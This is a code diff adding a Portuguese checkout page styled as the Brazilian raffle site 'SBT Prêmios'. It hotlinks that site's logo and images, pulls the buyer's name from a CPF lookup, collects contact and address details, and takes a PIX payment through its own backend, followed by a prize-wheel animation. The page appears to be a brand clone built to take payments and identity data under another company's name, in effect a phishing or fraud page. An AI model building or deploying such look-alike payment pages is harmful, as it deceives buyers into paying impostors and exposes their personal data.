@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
+<title>Checkout — SBT Prêmios</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="/app.css" />
+<style>
+  .wrap { max-width: 620px; margin: 0 auto; padding: 16px; }
+  .steps { display: flex; align-items: center; margin: 24px 0 8px; }
+  .steps .dot { width: 34px; height: 34px; border-radius: 50%; border: 2px solid var(--border); color: var(--muted); display: flex; align-items: center; justify-content: center; font-weight: 700; background: #fff; flex: 0 0 auto; }
+  .steps .dot.active { background: var(--brand); border-color: var(--brand); color: #fff; }
+  .steps .dot.done { background: var(--brand); border-color: var(--brand); color: #fff; }
+  .steps .bar { flex: 1; height: 2px; background: var(--border); }
+  .steps .bar.done { background: var(--brand); }
+  .center { text-align: center; font-weight: 700; margin: 20px 0 4px; letter-spacing: .5px; }
+  .summary { background: #f6f7f9; border: 1px solid var(--border); border-radius: 12px; padding: 16px; }
+  .summary .row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 14px; }
+  .summary .row .k { color: var(--muted); }
+  .guard { display: flex; gap: 10px; align-items: flex-start; margin-top: 18px; }
+  .guard .sh { color: var(--green); font-size: 22px; }
+  .guard b { display: block; }
+  .totbar { background: #f6f7f9; border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
+  .step { display: none; }
+  .step.active { display: block; }
+  .pix-status { background: #eef2ff; border: 1px solid #c7d2fe; border-radius: 10px; padding: 12px 14px; display: flex; justify-content: space-between; align-items: center; }
+  .pix-status .exp { font-size: 13px; } .pix-status .exp b { color: var(--brand); }
+  .pix-steps { background: #f6f7f9; border: 1px solid var(--border); border-radius: 10px; padding: 6px 14px; margin-top: 10px; }
+  .pix-steps .li { display: flex; gap: 10px; padding: 8px 0; font-size: 14px; align-items: baseline; }
+  .pix-steps .n { width: 22px; height: 22px; border-radius: 50%; background: #e5e7eb; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; flex: 0 0 auto; }
+  #qrbox { display: flex; justify-content: center; padding: 16px; border: 1px solid var(--border); border-radius: 12px; }
+  #qrbox canvas, #qrbox img { width: 220px; height: 220px; }
+  .ok-check { width: 72px; height: 72px; border-radius: 50%; background: var(--green); color: #fff; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 20px auto; }
+  #piao-modal { position: fixed; inset: 0; background: rgba(3,7,32,.75); z-index: 60; display: none; align-items: center; justify-content: center; padding: 16px; }
+  #piao-modal.open { display: flex; }
+  .piao-card { position: relative; border-radius: 16px; padding: 22px 20px; width: 360px; max-width: 92vw; text-align: center; color: #fff;
+    background: #0540fa url('https://sbtpremios.com/_next/static/media/backgroundSpinningTop.e45beed3.jpg') center/cover; box-shadow: 0 30px 80px rgba(0,0,0,.5); }
+  .piao-title { font-weight: 800; font-size: 26px; color: #ffd21e; letter-spacing: 1px; text-shadow: 0 2px 0 #002; }
+  .prize-row { display: flex; gap: 8px; justify-content: center; margin: 12px 0 6px; }
+  .prize { background: #fff; color: #0540fa; font-weight: 800; font-size: 13px; border-radius: 8px; padding: 8px 6px; flex: 1; box-shadow: 0 3px 0 rgba(0,0,0,.22); }
+  #piao-giro { font-size: 12px; font-weight: 700; color: #ffd21e; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+  .wheel-stage { position: relative; width: 250px; height: 250px; margin: 6px auto 10px; }
+  #piao-wheel { width: 250px; height: 250px; display: block; will-change: transform; }
+  .wheel-hub { position: absolute; top: 50%; left: 50%; width: 92px; height: 92px; margin: -46px 0 0 -46px; border-radius: 50%; pointer-events: none;
+    background: radial-gradient(circle at 38% 30%, #2b6bff 0%, #0a3fd0 46%, #06216e 100%); box-shadow: inset 0 4px 10px rgba(255,255,255,.35), 0 4px 12px rgba(0,0,0,.4); }
+  .wheel-pointer { position: absolute; top: -4px; left: 50%; margin-left: -12px; width: 0; height: 0; border-left: 12px solid transparent; border-right: 12px solid transparent; border-top: 22px solid #ffd21e; z-index: 3; filter: drop-shadow(0 2px 2px rgba(0,0,0,.45)); }
+  #piao-result { font-size: 16px; font-weight: 800; margin: 2px 0 8px; }
+  #piao-result.win { color: #c6ff3a; } #piao-result.lose { color: #dfe6ff; }
+  #piao-result .big { display: block; font-size: 30px; font-weight: 800; color: #fff; margin-top: 4px; }
+</style>
+</head>
+<body>
+  <header class="hdr">
+    <div class="hdr-inner">
+      <button class="icon-btn" aria-label="Menu"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg></button>
+      <img class="hdr-logo" src="https://sbtpremios.com/images/SbtPremiosLogo.png" alt="SBT Prêmios" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'hdr-logo-txt',textContent:'SBT PRÊMIOS'}))" />
+      <button class="icon-btn" data-account aria-label="Minha Conta"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.5-6 8-6s8 2 8 6"/></svg></button>
+    </div>
+  </header>
+
+  <div class="wrap">
+    <div class="steps">
+      <div class="dot active" id="d1">1</div><div class="bar" id="b1"></div>
+      <div class="dot" id="d2">2</div><div class="bar" id="b2"></div>
+      <div class="dot" id="d3">3</div><div class="bar" id="b3"></div>
+      <div class="dot" id="d4">4</div>
+    </div>
+    <div id="msg" class="msg"></div>
+
+    <!-- PASSO 1: DADOS PESSOAIS -->
+    <section class="step active" id="s1">
+      <div class="summary">
+        <div style="text-align:center;font-weight:700;margin-bottom:8px">Resumo da Compra</div>
+        <div class="row"><span class="k">Sorteio:</span><span id="sm-raffle">MAIS DE R$400MIL EM PRÊMIOS</span></div>
+        <div class="row"><span class="k">Quantidade:</span><span id="sm-qty">10 títulos</span></div>
+        <div class="row"><span class="k">Valor unitário:</span><span>R$ 1,99</span></div>
+      </div>
+      <div class="center">DADOS PESSOAIS</div>
+      <label class="fld" for="cpf">CPF</label>
+      <input class="inp" id="cpf" inputmode="numeric" placeholder="000.000.000-00" />
+      <div class="muted" id="cpf-hint" style="font-size:12px;margin-top:4px">Poderemos consultar bases públicas e privadas para validar seus dados cadastrais.</div>
+      <div id="pdata" style="display:none">
+        <label class="fld" for="nome">Nome completo</label>
+        <input class="inp" id="nome" placeholder="Nome completo" />
+        <label class="fld" for="email">Email (obrigatório)</label>
+        <input class="inp" id="email" type="email" placeholder="voce@email.com" />
+        <label class="fld" for="cel">Celular</label>
+        <input class="inp" id="cel" inputmode="tel" placeholder="(00) 00000-0000" />
+        <label class="fld" for="cel2">Confirmar celular</label>
+        <input class="inp" id="cel2" inputmode="tel" placeholder="(00) 00000-0000" />
+        <label class="check"><input type="checkbox" id="mkt" /> Aceito receber comunicações de marketing e ofertas</label>
+        <label class="check"><input type="checkbox" id="terms" /> Concordo com a <a href="/politica-de-privacidade">Política de Privacidade</a> e <a href="/termos-de-uso">Termos de Uso</a> *</label>
+      </div>
+      <div class="guard"><span class="sh">🛡️</span><div><b>Compra Garantida</b>Receba seus títulos para concorrer ao sorteio ou devolvemos seu dinheiro.</div></div>
+      <div class="totbar"><b>VALOR TOTAL</b><span class="gold" id="tot1" style="font-size:20px">R$ 19,90</span></div>
+      <button class="btn btn-green" style="margin-top:14px" id="go2">CONTINUAR »</button>
+    </section>
+
+    <!-- PASSO 2: ENDEREÇO -->
+    <section class="step" id="s2">
+      <div class="center">ENDEREÇO DE ENTREGA</div>
+      <div class="grid2">
+        <div><label class="fld" for="cep">CEP</label><input class="inp" id="cep" inputmode="numeric" placeholder="00000-000" /></div>
+        <div><label class="fld" for="uf">Estado</label>
+          <select class="inp" id="uf"><option value="">Estado</option>
+            <option>AC</option><option>AL</option><option>AP</option><option>AM</option><option>BA</option><option>CE</option><option>DF</option><option>ES</option><option>GO</option><option>MA</option><option>MT</option><option>MS</option><option>MG</option><option>PA</option><option>PB</option><option>PR</option><option>PE</option><option>PI</option><option>RJ</option><option>RN</option><option>RS</option><option>RO</option><option>RR</option><option>SC</option><option>SP</option><option>SE</option><option>TO</option>
+          </select>
+        </div>
+      </div>
+      <div class="grid2">
+        <div><label class="fld" for="cidade">Cidade</label><input class="inp" id="cidade" placeholder="Cidade" /></div>
+        <div><label class="fld" for="bairro">Bairro</label><input class="inp" id="bairro" placeholder="Bairro" /></div>
+      </div>
+      <label class="fld" for="logr">Logradouro</label>
+      <input class="inp" id="logr" placeholder="Rua/Avenida" />
+      <div class="grid2">
+        <div><label class="fld" for="num">Número</label><input class="inp" id="num" inputmode="numeric" placeholder="Número" /></div>
+        <div><label class="fld" for="compl">Complemento</label><input class="inp" id="compl" placeholder="Opcional" /></div>
+      </div>
+      <div class="totbar"><b>VALOR TOTAL</b><span class="gold" id="tot2" style="font-size:20px">R$ 19,90</span></div>
+      <button class="btn btn-green" style="margin-top:14px" id="go3">CONTINUAR »</button>
+      <button class="btn btn-ghost" style="margin-top:10px" id="back2">VOLTAR</button>
+    </section>
+
+    <!-- PASSO 3: PAGAMENTO PIX -->
+    <section class="step" id="s3">
+      <div class="center">PAGAMENTO</div>
+      <div class="pix-status">
+        <b>Aguardando pagamento</b>
+        <span class="exp">EXPIRA EM <b id="pix-timer">05:00</b></span>
+      </div>
+      <div class="pix-steps">
+        <div class="li"><span class="n">1</span><span>Clique em <b>Copiar e pagar agora</b></span></div>
+        <div class="li"><span class="n">2</span><span>Abra o app do seu banco e use <b>Pix Copia e Cola</b> para concluir o pagamento</span></div>
+        <div class="li"><span class="n">3</span><span>Após pagar, <b>retorne para esta tela</b> e aguarde a confirmação automática</span></div>
+      </div>
+      <div class="guard"><span class="sh">🛡️</span><div><b>Compra Garantida</b>Receba seus títulos para concorrer ao sorteio ou devolvemos seu dinheiro.</div></div>
+      <div class="totbar"><b>VALOR TOTAL</b><span class="gold" id="tot3" style="font-size:20px">R$ 19,90</span></div>
+      <button class="btn btn-green" style="margin-top:14px" id="copypix">⧉ COPIAR E PAGAR AGORA</button>
+      <div class="muted" style="text-align:center;font-size:12px;margin-top:6px">Mais rápido com Pix Copia e Cola</div>
+      <button class="btn btn-ghost" style="margin-top:10px" id="showqr">▦ VER QR CODE</button>
+      <button class="btn btn-blue-outline" style="margin-top:10px" id="paid">JÁ REALIZEI O PAGAMENTO</button>
+      <div class="muted" style="text-align:center;font-size:12px;margin-top:6px">O pagamento é confirmado automaticamente após a compensação</div>
+    </section>
+
+    <!-- PASSO 4: CONFIRMAÇÃO -->
+    <section class="step" id="s4">
+      <div class="summary" style="display:flex;gap:14px;align-items:center;text-align:left">
+        <div class="ok-check" style="margin:0;flex:0 0 auto;width:56px;height:56px;font-size:28px">✓</div>
+        <div>
+          <div style="font-weight:800;font-size:17px">PARABÉNS!</div>
+          <div style="font-weight:600">PAGAMENTO CONCLUÍDO!</div>
+          <div class="muted" style="font-size:13px;margin-top:4px">Para acessar, a qualquer momento clique em <b>meus títulos</b> e boa sorte! 🍀</div>
+        </div>
+      </div>
+      <button class="btn btn-green" style="margin-top:14px" id="ok-tickets">☑ MEUS TÍTULOS (<span id="ok-count">5</span>S)</button>
+    </section>
+  </div>
+
+  <!-- Drawer do QR Code -->
+  <div class="overlay" id="qr-overlay"></div>
+  <aside class="drawer" id="qr-drawer" aria-hidden="true">
+    <div class="drawer-head"><h2>Escaneie o QR Code para pagar</h2><button class="drawer-close" id="qr-x">&times;</button></div>
+    <div class="drawer-body" style="text-align:center">
+      <p class="muted" style="font-size:13px">Use seu app de pagamento para escanear o código</p>
+      <p style="font-size:14px">⏱ Expira em <b class="gold" id="qr-timer">05:00</b></p>
+      <div id="qrbox"></div>
+      <button class="btn btn-blue" style="margin-top:16px" id="qr-copy">⧉ COPIAR CÓDIGO PIX</button>
+      <button class="btn btn-ghost" style="margin-top:10px" id="qr-new">▦ GERAR NOVO QR CODE</button>
+    </div>
+  </aside>
+
+  <!-- PIÃO DA SORTE — premiação instantânea pós-pagamento (assets reais do site) -->
+  <div id="piao-modal">
+    <div class="piao-card">
+      <div class="piao-title">PIÃO DA SORTE</div>
+      <div class="prize-row">
+        <div class="prize">R$ 10.000</div>
+        <div class="prize">R$ 1.000</div>
+        <div class="prize">R$ 500</div>
+      </div>
+      <div id="piao-giro">1 giro disponível</div>
+      <div class="wheel-stage">
+        <div class="wheel-pointer"></div>
+        <img id="piao-wheel" alt="Roleta Pião da Sorte"
+             src="https://sbtpremios.com/_next/static/media/SpinningTopBorder.76ec7ac7.png"
+             onerror="this.style.background='#fff';this.style.borderRadius='50%'" />
+        <div class="wheel-hub"></div>
+      </div>
+      <div id="piao-result" style="display:none"></div>
+      <button class="btn btn-green" id="piao-spin" style="margin-top:8px">GIRAR PIÃO</button>
+      <button class="btn btn-blue" id="piao-cont" style="margin-top:8px;display:none">CONTINUAR</button>
+    </div>
+  </div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="/conta.js"></script>
+<script>
+  const API = "/api/v2", UNIT = 1.99;
+  const $ = (id) => document.getElementById(id);
+  const digits = (v) => (v || "").replace(/\D/g, "");
+  const brl = (n) => "R$ " + Number(n).toLocaleString("pt-BR", { minimumFractionDigits: 2 });
+  const params = new URLSearchParams(location.search);
+  let qty = Math.max(1, parseInt(params.get("qty"), 10) || 10);
+  let orderId = null, pixCode = null, pixTimerInt = null;
+
+  function setTotals() {
+    const t = brl(qty * UNIT);
+    $("tot1").textContent = t; $("tot2").textContent = t; $("tot3").textContent = t;
+    $("sm-qty").textContent = qty + " títulos";
+  }
+  setTotals();
+
+  function showMsg(t, txt) { const m=$("msg"); m.className="msg "+(t==="ok"?"ok":"err"); m.textContent=txt; setTimeout(()=>{m.className="msg";}, 4000); }
+
+  function goStep(n) {
+    for (let i=1;i<=4;i++) $("s"+i).classList.toggle("active", i===n);
+    for (let i=1;i<=4;i++){ const d=$("d"+i); d.classList.toggle("active", i===n); d.classList.toggle("done", i<n); if(i<n)d.innerHTML="✓"; else d.textContent=i; }
+    for (let i=1;i<=3;i++) $("b"+i).classList.toggle("done", i<n);
+    window.scrollTo(0,0);
+  }
+
+  // No passo 1 aparece só o CPF. Ao consultá-lo, os demais dados são revelados.
+  let pdataShown = false;
+  async function lookupCpf() {
+    const c = digits($("cpf").value); if (c.length !== 11) return false;
+    $("cpf-hint").textContent = "Buscando cadastro...";
+    const r = await fetch(API+"/customers/lookup",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpf:c})});
+    const d = await r.json();
+    if (r.ok && d.name) {
+      $("nome").value = d.name;
+      $("cpf-hint").textContent = "Nome localizado nas bases. Confira seus dados.";
+      $("pdata").style.display = "block"; pdataShown = true;
+      return true;
+    }
+    $("cpf-hint").textContent = d.message || "CPF não encontrado.";
+    return false;
+  }
+  $("cpf").addEventListener("blur", () => { if (digits($("cpf").value).length === 11) lookupCpf(); });
+
+  // CONTINUAR do passo 1: 1ª vez revela os dados; 2ª vez valida e vai pro passo 2.
+  $("go2").onclick = async () => {
+    if (digits($("cpf").value).length !== 11) return showMsg("err","Informe um CPF válido.");
+    if (!pdataShown) { const ok = await lookupCpf(); if (!ok) showMsg("err","Não foi possível consultar o CPF."); return; }
+    if (!$("nome").value.trim()) return showMsg("err","Informe o nome.");
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test($("email").value)) return showMsg("err","E-mail é obrigatório.");
+    if (digits($("cel").value).length < 10) return showMsg("err","Informe o celular.");
+    if (digits($("cel").value) !== digits($("cel2").value)) return showMsg("err","Os celulares não conferem.");
+    if (!$("terms").checked) return showMsg("err","Você deve concordar com os Termos de Uso.");
+    goStep(2);
+  };
+
+  // CEP autocomplete (viacep, igual ao site)
+  $("cep").addEventListener("blur", async () => {
+    const c = digits($("cep").value); if (c.length !== 8) return;
+    try {
+      const d = await fetch(`https://viacep.com.br/ws/${c}/json/`).then(r=>r.json());
+      if (!d.erro) { $("uf").value=d.uf||""; $("cidade").value=d.localidade||""; $("bairro").value=d.bairro||""; $("logr").value=d.logradouro||""; }
+    } catch {}
+  });
+
+  // PASSO 2 -> 3 : cria pedido + gera PIX
+  $("back2").onclick = () => goStep(1);
+  $("go3").onclick = async () => {
+    if (digits($("cep").value).length !== 8 || !$("uf").value || !$("num").value.trim())
+      return showMsg("err","Preencha o endereço (CEP, estado e número).");
+    const body = {
+      cpf: digits($("cpf").value), name: $("nome").value.trim(), email: $("email").value.trim(),
+      phone: digits($("cel").value), quantity: qty,
+      address: { cep: digits($("cep").value), uf: $("uf").value, cidade: $("cidade").value, bairro: $("bairro").value, logradouro: $("logr").value, numero: $("num").value, complemento: $("compl").value },
+    };
+    const r = await fetch(API+"/carts/purchase",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
+    const d = await r.json();
+    if (!r.ok) return showMsg("err", d.message || "Erro ao criar o pedido.");
+    orderId = d.orderId; $("sm-raffle").textContent = d.summary.raffleTitle;
+    const p = await fetch(`${API}/checkout/${orderId}/pix`,{method:"POST"}).then(x=>x.json());
+    pixCode = p.pixCode;
+    goStep(3); startPixTimer(new Date(p.expiresAt).getTime());
+    pollStatus();
+  };
+
+  function startPixTimer(expMs) {
+    clearInterval(pixTimerInt);
+    const tick = () => {
+      const left = Math.max(0, Math.floor((expMs - Date.now())/1000));
+      const m = String(Math.floor(left/60)).padStart(2,"0"), s = String(left%60).padStart(2,"0");
+      $("pix-timer").textContent = `${m}:${s}`; $("qr-timer").textContent = `${m}:${s}`;
+      if (left<=0) clearInterval(pixTimerInt);
+    };
+    tick(); pixTimerInt = setInterval(tick, 1000);
+  }
+
+  async function copyPix() { try { await navigator.clipboard.writeText(pixCode); showMsg("ok","Código PIX copiado!"); } catch { showMsg("ok","Código: "+pixCode.slice(0,40)+"..."); } }
+  $("copypix").onclick = copyPix;
+  $("qr-copy").onclick = copyPix;
+
+  // QR drawer
+  function openQR() {
+    $("qrbox").innerHTML = "";
+    new QRCode($("qrbox"), { text: pixCode, width: 220, height: 220 });
+    $("qr-drawer").classList.add("open"); $("qr-overlay").classList.add("open");
+  }
+  function closeQR() { $("qr-drawer").classList.remove("open"); $("qr-overlay").classList.remove("open"); }
+  $("showqr").onclick = openQR; $("qr-x").onclick = closeQR; $("qr-overlay").onclick = closeQR;
+  $("qr-new").onclick = async () => { const p = await fetch(`${API}/checkout/${orderId}/pix`,{method:"POST"}).then(x=>x.json()); pixCode=p.pixCode; openQR(); startPixTimer(new Date(p.expiresAt).getTime()); };
+
+  // Confirmação (demo): "Já realizei o pagamento" simula o webhook do PSP
+  $("paid").onclick = async () => {
+    await fetch(`${API}/checkout/${orderId}/confirm`,{method:"POST"});
+    finish();
+  };
+  async function pollStatus() {
+    if (!orderId) return;
+    const d = await fetch(`${API}/checkout/${orderId}/status`).then(x=>x.json()).catch(()=>({}));
+    if (d.status === "paid") return finish();
+    if ($("s3").classList.contains("active")) setTimeout(pollStatus, 4000);
+  }
+  // Pós-pagamento: abre a Pião da Sorte (premiação instantânea).
+  let piaoDone = false;
+  function finish() {
+    clearInterval(pixTimerInt); closeQR();
+    if (!piaoDone) { $("piao-modal").classList.add("open"); return; }
+    goToConfirm();
+  }
+  function goToConfirm() {
+    goStep(4);
+    let n = 5;
+    const go = () => { location.href = "/?meus-titulos=1"; };
+    $("ok-tickets").onclick = go;
+    const ci = setInterval(() => { n--; $("ok-count").textContent = n; if (n <= 0) { clearInterval(ci); go(); } }, 1000);
+  }
+
+  // ---- Som (WebAudio): zumbido do pião girando + jingle de vitória ----
+  let actx;
+  function ac() { actx = actx || new (window.AudioContext || window.webkitAudioContext)(); return actx; }
+  function spinSound(ms) {
+    const c = ac(), t0 = c.currentTime, dur = ms / 1000;
+    const osc = c.createOscillator(), g = c.createGain(), lfo = c.createOscillator(), lg = c.createGain();
+    osc.type = "sawtooth";
+    osc.frequency.setValueAtTime(330, t0);
+    osc.frequency.exponentialRampToValueAtTime(85, t0 + dur);
+    g.gain.setValueAtTime(0.0001, t0);
+    g.gain.exponentialRampToValueAtTime(0.13, t0 + 0.12);
+    g.gain.setValueAtTime(0.13, t0 + dur - 0.3);
+    g.gain.exponentialRampToValueAtTime(0.0001, t0 + dur);
+    lfo.frequency.value = 16; lg.gain.value = 22; lfo.connect(lg); lg.connect(osc.frequency);
+    osc.connect(g); g.connect(c.destination);
+    osc.start(t0); lfo.start(t0); osc.stop(t0 + dur); lfo.stop(t0 + dur);
+  }
+  function winSound() {
+    const c = ac(), t0 = c.currentTime;
+    [523, 659, 784, 1047].forEach((f, i) => {
+      const o = c.createOscillator(), g = c.createGain(), t = t0 + i * 0.13;
+      o.type = "triangle"; o.frequency.value = f;
+      g.gain.setValueAtTime(0.0001, t); g.gain.exponentialRampToValueAtTime(0.2, t + 0.03); g.gain.exponentialRampToValueAtTime(0.0001, t + 0.25);
+      o.connect(g); g.connect(c.destination); o.start(t); o.stop(t + 0.26);
+    });
+  }
+  function loseSound() {
+    const c = ac(), t0 = c.currentTime, o = c.createOscillator(), g = c.createGain();
+    o.type = "sine"; o.frequency.setValueAtTime(300, t0); o.frequency.exponentialRampToValueAtTime(140, t0 + 0.5);
+    g.gain.setValueAtTime(0.14, t0); g.gain.exponentialRampToValueAtTime(0.0001, t0 + 0.5);
+    o.connect(g); g.connect(c.destination); o.start(t0); o.stop(t0 + 0.5);
+  }
+
+  function spinAnim(ms) {
+    return new Promise((resolve) => {
+      const wheel = $("piao-wheel"), start = performance.now();
+      const total = 6 * 360 + (arguments[1] || 0);    // 6 voltas + ângulo final
+      const ease = (t) => 1 - Math.pow(1 - t, 3);      // desacelera no fim
+      function frame(now) {
+        const p = Math.min(1, (now - start) / ms);
+        wheel.style.transform = `rotate(${ease(p) * total}deg)`;
+        if (p < 1) requestAnimationFrame(frame); else resolve();
+      }
+      requestAnimationFrame(frame);
+    });
+  }
+
+  $("piao-spin").onclick = async () => {
+    $("piao-spin").style.display = "none"; $("piao-giro").textContent = "girando...";
+    const DUR = 4200;
+    try { ac().resume(); spinSound(DUR); } catch {}
+    const resp = await fetch(`${API}/checkout/${orderId}/piao`, { method: "POST" }).then(r => r.json()).catch(() => ({ won: false }));
+    await spinAnim(DUR, Math.floor(Math.random() * 360));
+    const res = $("piao-result"); res.style.display = "block";
+    if (resp.won) {
+      res.className = "win"; res.innerHTML = `Parabéns pelo prêmio! 🎉<span class="big">${brl(resp.prize)} no PIX</span>`;
+      $("piao-giro").textContent = "prêmio creditado no saldo";
+      try { winSound(); } catch {}
+    } else {
+      res.className = "lose"; res.innerHTML = `Não foi dessa vez 😕<br><span style="font-size:13px;font-weight:400">Seu título segue concorrendo ao sorteio principal.</span>`;
+      $("piao-giro").textContent = "sem giros disponíveis";
+      try { loseSound(); } catch {}
+    }
+    piaoDone = true;
+    $("piao-cont").style.display = "block";
+  };
+  $("piao-cont").onclick = () => { $("piao-modal").classList.remove("open"); goToConfirm(); };
+</script>
+</body>
+</html>
